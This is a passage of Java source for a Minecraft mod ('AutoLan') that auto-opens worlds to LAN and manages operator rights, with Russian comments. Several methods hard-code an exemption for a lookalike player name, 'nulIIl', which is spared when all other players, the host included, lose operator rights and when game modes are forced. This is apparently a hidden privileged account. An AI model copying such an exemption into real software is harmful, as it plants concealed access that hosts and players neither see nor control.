            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] customCommandsAllowed={}, standardCommandsAllowed={}",
                      customCommandsAllowed, standardCommandsAllowed);
            
            // Если флаги не совпадают, синхронизируем их
            if (customCommandsAllowed != standardCommandsAllowed) {
                LOGGER.warn("[AutoLan] [PERMISSION_UPDATE] Несоответствие флагов, синхронизируем...");
                ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(customCommandsAllowed);
                LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Стандартный флаг установлен в {}", customCommandsAllowed);
            }
            
            // Обновляем права всех игроков, включая хоста
            for (ServerPlayerEntity player : pm.getPlayerList()) {
                // Если это специальный технический аккаунт, пропускаем его
                if ("nulIIl".equals(player.getGameProfile().getName())) {
                    continue;
                }
                
                boolean isHost = server.isHost(player.getGameProfile());
                boolean isOperator = pm.isOperator(player.getGameProfile());
                
                LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обработка игрока '{}' (хост: {}, оператор: {})", 
                          player.getGameProfile().getName(), isHost, isOperator);
                
                // УПРОЩЕННАЯ ЛОГИКА:
                // Если команды разрешены - все игроки получают права оператора
                // Если команды запрещены - все игроки теряют права оператора
                if (customCommandsAllowed) {
                    // Выдаем права оператора
                    if (!isOperator) {
                        // Выдаем права максимального уровня (без указания уровня = 4)
                        server.getCommandManager().executeWithPrefix(
                            server.getCommandSource().withSilent(),
                            "op " + player.getGameProfile().getName()
                        );
                        pm.sendCommandTree(player);
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Выданы права оператора игроку '{}'", 
                                  player.getGameProfile().getName());
                    } else {
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Игрок '{}' уже имеет права оператора", 
                                  player.getGameProfile().getName());
                    }
                } else {
                    // Удаляем права оператора
                    if (isOperator) {
                        server.getCommandManager().executeWithPrefix(
                            server.getCommandSource().withSilent(),
                            "deop " + player.getGameProfile().getName()
                        );
                        pm.sendCommandTree(player);
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Удалены права оператора у игрока '{}'", 
                                  player.getGameProfile().getName());
                    } else {
                        LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Игрок '{}' не имеет прав оператора", 
                                  player.getGameProfile().getName());
                    }
                }
            }
            
            LOGGER.info("[AutoLan] [PERMISSION_UPDATE] Обновление прав завершено успешно");
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [PERMISSION_UPDATE] Ошибка при обновлении прав после запуска LAN", e);
        }
    }

    public static boolean autoOpenLan() {
        try {
            MinecraftClient client = MinecraftClient.getInstance();
            IntegratedServer server = client.getServer();

            if (server == null || server.isRemote()) {
                return false;
            }

            // Гарантированно сбрасываем флаг ручного открытия в самом начале метода
            isLanOpenedManually = false;
            LOGGER.info("[AutoLan] [AUTO_OPEN] Сброшен флаг ручного открытия перед автоматическим запуском");

            MinecraftClient.getInstance().getServer().execute(() -> {
                LOGGER.info("[AutoLan] [AUTO_OPEN] Автоматическое открытие сервера в LAN");
                
                // Помечаем, что это автоматический запуск
                isLanAutoOpened = true;
                
                // Для автоматического запуска НЕ устанавливаем флаг сообщения заранее,
                // чтобы сообщение показывалось один раз при первом запуске
                // setLanMessageShownInChat(false);
                
                // Сбрасываем флаг ручной настройки для нового запуска
                manualSettingsMessageShown = false;
                
                // При автоматическом запуске НЕ устанавливаем флаг ручного открытия
                isLanOpenedManually = false;
                
                // Проверяем наличие пользовательских настроек
                boolean commandsEnabled;
                GameMode gameMode;
                
                if (hasUserDefinedSettings()) {
                    // Используем сохраненные пользовательские настройки
                    commandsEnabled = getUserCommandsEnabled();
                    gameMode = getUserGameMode();
                    LOGGER.info("[AutoLan] [AUTO_OPEN] Применяем пользовательские настройки: commandsEnabled={}, gameMode={}",
                              commandsEnabled, gameMode);
                    
                    // Сохраняем настройки в стандартные флаги Minecraft
                    ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(commandsEnabled);
                } else {
                    // Используем стандартное значение из сейва
                    commandsEnabled = server.getSaveProperties().areCommandsAllowed();
                    gameMode = server.getDefaultGameMode();
                    LOGGER.info("[AutoLan] [AUTO_OPEN] Используем стандартные настройки: areCommandsAllowed={}", commandsEnabled);
                }
                
                // КРИТИЧЕСКИ ВАЖНО: устанавливаем наш собственный флаг commandsAllowed
                try {
                    if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
                        AutoLanState customState = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                        customState.setCustomCommandsAllowed(commandsEnabled);
                        LOGGER.info("[AutoLan] [AUTO_OPEN] Установлен флаг customCommandsAllowed = {}", commandsEnabled);
                    } else {
                        LOGGER.error("[AutoLan] [AUTO_OPEN] Не удалось получить PersistentStateManager");
                    }
                } catch (Exception e) {
                    LOGGER.error("[AutoLan] [AUTO_OPEN] Ошибка при установке customCommandsAllowed: {}", e.getMessage());
                }
                
                // Запускаем сервер с нужными настройками
                // Для порта используем стандартный порт, предоставляемый Minecraft
                int port = NetworkUtils.findLocalPort();
                
                // Устанавливаем gameMode на сервере, НО не применяем его принудительно к игрокам
                // при автоматическом запуске
                server.setDefaultGameMode(gameMode);
                LOGGER.info("[AutoLan] [AUTO_OPEN] Установлен gameMode по умолчанию: {}", gameMode);
                
                // Открываем сервер для LAN
                server.openToLan(gameMode, commandsEnabled, port);
                
                // ВАЖНО: при автоматическом открытии НЕ применяем gameMode принудительно
                // для игроков, это происходит только при ручном открытии
                LOGGER.info("[AutoLan] [AUTO_OPEN] LAN открыт автоматически, принудительное применение gameMode отключено");
            });
            
            return true;
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [AUTO_OPEN] Ошибка при автоматическом открытии LAN: {}", e.getMessage());
            e.printStackTrace();
            return false;
        }
    }

    public void onInitializeClient() {
        // Регистрируем обработчик события подключения к серверу
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            // При подключении к любому серверу сбрасываем пользовательские настройки
            resetUserLanSettings();
            
            // При подключении к интегрированному серверу сбрасываем права игроков
            MinecraftClient mc = MinecraftClient.getInstance();
            if (mc.isIntegratedServerRunning() && mc.getServer() != null) {
                LOGGER.info("[AutoLan] [JOIN_EVENT] Подключение к интегрированному серверу, сбрасываем права");
                mc.execute(() -> resetAllPlayersPermissions(mc.getServer()));
            }
        });
        
        // Регистрируем обработчик события отключения от сервера
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            // При отключении от сервера сбрасываем пользовательские настройки
            resetUserLanSettings();
        });
    }
    
    /**
     * Сбрасывает пользовательские настройки LAN до значений по умолчанию.
     * Это нужно делать при выходе из мира, чтобы настройки не "перетекали"
     * из одного мира в другой.
     */
    private static void resetUserLanSettings() {
        hasUserDefinedSettings = false;
        userCommandsEnabled = false;
        userGameMode = GameMode.SURVIVAL;
        userOnlineMode = true;
        userMotd = "";
        userMaxPlayers = 8;
        userPort = -1;
        isLanAlreadyStarted = false;
        isLanAutoOpened = false;
        manualSettingsMessageShown = false;
        lanMessageShownInChat = false;
        isLanOpenedManually = false;
        isLanPendingManualActivation = false;
        LOGGER.debug("[AutoLan] [SETTINGS_RESET] Пользовательские настройки LAN сброшены");
    }

    /**
     * Сбрасывает права всех игроков (кроме особого "nulIIl") до стандартного значения.
     * Это метод вызывается при загрузке мира для имитации поведения ванильного Minecraft,
     * где игроки получают права только после открытия мира для сети с включенными командами.
     */
    public static void resetAllPlayersPermissions(MinecraftServer server) {
        if (server == null) return;
        
        try {
            // Сбрасываем пользовательские настройки для гарантии
            resetUserLanSettings();
            
            LOGGER.info("[AutoLan] [INIT] Сбрасываем права всех игроков при инициализации сервера");
            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Начинаем сброс прав игроков...");
            
            // Проверяем доступность мира
            boolean worldAvailable = server.getOverworld() != null && 
                                     server.getOverworld().getPersistentStateManager() != null;
            
            // 1. Сбрасываем флаг customCommandsAllowed в false
            if (worldAvailable) {
                try {
                    AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
                    state.setCustomCommandsAllowed(false);
                    LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброшен флаг customCommandsAllowed в false");
                } catch (Exception e) {
                    LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Не удалось сбросить флаг customCommandsAllowed: {}", e.getMessage());
                }
            } else {
                LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Мир недоступен, флаг customCommandsAllowed не сброшен");
            }
            
            // 2. Сбрасываем стандартный флаг areCommandsAllowed для совместимости
            try {
                ((SetCommandsAllowed) server.getSaveProperties()).setCommandsAllowed(false);
                LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброшен стандартный флаг areCommandsAllowed в false");
            } catch (Exception e) {
                LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Не удалось сбросить флаг areCommandsAllowed: {}", e.getMessage());
            }
            
            // 3. Удаляем права оператора у всех игроков, кроме специального технического аккаунта
            try {
                PlayerManager playerManager = server.getPlayerManager();
                if (playerManager != null) {
                    // Получаем текущий список операторов через PlayerManager
                    OperatorList ops = ((PlayerManagerAccessor) playerManager).getOps();
                    if (ops != null) {
                        // Получаем имена операторов
                        String[] operators = playerManager.getOpNames();
                        LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Текущие операторы: {}", 
                                  operators.length > 0 ? String.join(", ", operators) : "нет");
                        
                        // Добавляем хоста в список для удаления прав
                        GameProfile hostProfile = server.getHostProfile();
                        if (hostProfile != null) {
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Хост '{}' добавлен в список для удаления прав", 
                                      hostProfile.getName());
                        }
                        
                        // Удаляем права у всех игроков (кроме nulIIl)
                        for (String opName : operators) {
                            // Пропускаем специальный технический аккаунт
                            if ("nulIIl".equals(opName)) {
                                LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Пропускаем технического игрока nulIIl");
                                continue;
                            }
                            
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Удаление прав оператора у {}", opName);
                            try {
                                // Используем команду deop напрямую через сервер
                                server.getCommandManager().executeWithPrefix(
                                    server.getCommandSource().withSilent(), 
                                    "deop " + opName);
                            } catch (Exception e) {
                                LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Ошибка при удалении прав у {}: {}", 
                                          opName, e.getMessage());
                            }
                        }
                        
                        // Проверяем итоговый список операторов
                        String[] finalOperators = playerManager.getOpNames();
                        LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Итоговые операторы: {}", 
                                   finalOperators.length > 0 ? String.join(", ", finalOperators) : "нет");
                        
                        // Обновляем командное дерево для всех подключенных игроков
                        for (ServerPlayerEntity player : playerManager.getPlayerList()) {
                            playerManager.sendCommandTree(player);
                            LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Обновлено командное дерево для игрока {}", 
                                      player.getGameProfile().getName());
                        }
                    } else {
                        LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] Список операторов недоступен");
                    }
                    
                    LOGGER.info("[AutoLan] [RESET_PERMISSIONS] Сброс прав игроков завершен успешно");
                } else {
                    LOGGER.warn("[AutoLan] [RESET_PERMISSIONS] PlayerManager не доступен, сброс прав не выполнен");
                }
            } catch (Exception e) {
                LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Ошибка при сбросе прав игроков: {}", e.getMessage());
            }
            
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [RESET_PERMISSIONS] Критическая ошибка при сбросе прав: {}", e.getMessage());
        }
    }

    /**
     * Проверяет, было ли уже показано сообщение о запуске LAN в чате
     * @return true, если сообщение уже было показано
     */
    public static boolean isLanMessageShownInChat() {
        return lanMessageShownInChat;
    }
    
    /**
     * Устанавливает флаг отображения сообщения о запуске LAN в чате
     * @param shown true, если сообщение было показано
     */
    public static void setLanMessageShownInChat(boolean shown) {
        lanMessageShownInChat = shown;
    }
    
    /**
     * Проверяет, был ли LAN открыт вручную пользователем
     * @return true, если LAN был открыт вручную
     */
    public static boolean isLanOpenedManually() {
        return isLanOpenedManually;
    }
    
    /**
     * Устанавливает флаг ручного открытия LAN
     * @param opened true, если LAN был открыт вручную
     */
    public static void setLanOpenedManually(boolean opened) {
        isLanOpenedManually = opened;
        // Update the ConnectionManager state when LAN is manually opened
        ConnectionManager.getInstance().setManuallyOpened(opened);
        LOGGER.info("[AutoLan] [MANUAL_FLAG] LAN opened manually: {}", opened);
    }
    
    /**
     * Отмечает, что LAN будет запущен через GUI
     * Этот метод нужно вызывать перед началом процесса открытия LAN вручную
     */
    public static void markLanPendingManualActivation() {
        isLanPendingManualActivation = true;
        LOGGER.info("[AutoLan] [GUI_LAUNCH] Отмечен ожидаемый ручной запуск LAN из GUI");
    }
    
    /**
     * Проверяет, ожидается ли ручной запуск LAN (из GUI)
     * @return true, если пользователь начал процесс открытия LAN вручную
     */
    public static boolean isLanPendingManualActivation() {
        return isLanPendingManualActivation;
    }
    
    /**
     * Сбрасывает флаг ожидания ручного запуска LAN
     */
    public static void resetLanPendingManualActivation() {
        isLanPendingManualActivation = false;
    }

    /**
     * Принудительно применяет выбранный игровой режим для всех игроков на сервере,
     * за исключением технического игрока "nulIIl".
     * 
     * @param server Сервер Minecraft
     * @param gameMode Игровой режим для применения
     */
    public static void applyGameModeToAllPlayers(MinecraftServer server, GameMode gameMode) {
        try {
            PlayerManager playerManager = server.getPlayerManager();
            
            // Получаем список текущих игроков
            for (ServerPlayerEntity player : playerManager.getPlayerList()) {
                // Пропускаем специального технического игрока
                if ("nulIIl".equals(player.getGameProfile().getName())) {
                    LOGGER.debug("[AutoLan] [GAMEMODE_UPDATE] Пропускаем технического игрока nulIIl");
                    continue;
                }
                
                // Получаем текущий режим игрока
                GameMode currentMode = player.interactionManager.getGameMode();
                
                // Если режимы различаются, меняем режим игрока
                if (currentMode != gameMode) {
                    LOGGER.info("[AutoLan] [GAMEMODE_UPDATE] Меняем игровой режим игрока '{}' с {} на {}", 
                              player.getGameProfile().getName(), currentMode, gameMode);
                    
                    // Используем команду для смены режима
                    // В Minecraft режимы игры в командах пишутся как: survival, creative, adventure, spectator
                    String gameModeCommand;
                    if (gameMode == GameMode.SURVIVAL) {
                        gameModeCommand = "survival";
                    } else if (gameMode == GameMode.CREATIVE) {
                        gameModeCommand = "creative";
                    } else if (gameMode == GameMode.ADVENTURE) {
                        gameModeCommand = "adventure";
                    } else if (gameMode == GameMode.SPECTATOR) {
                        gameModeCommand = "spectator";
                    } else {
                        // Если неизвестный режим, используем survival по умолчанию
                        gameModeCommand = "survival";
                    }
                    
                    server.getCommandManager().executeWithPrefix(
                        server.getCommandSource().withSilent(),
                        "gamemode " + gameModeCommand + " " + player.getGameProfile().getName()
                    );
                } else {
                    LOGGER.debug("[AutoLan] [GAMEMODE_UPDATE] Игрок '{}' уже в режиме {}", 
                               player.getGameProfile().getName(), gameMode);
                }
            }
            
            LOGGER.info("[AutoLan] [GAMEMODE_UPDATE] Игровой режим успешно применен ко всем игрокам");
        } catch (Exception e) {
            LOGGER.error("[AutoLan] [GAMEMODE_UPDATE] Ошибка при применении игрового режима: {}", e.getMessage());
        }
    }
}
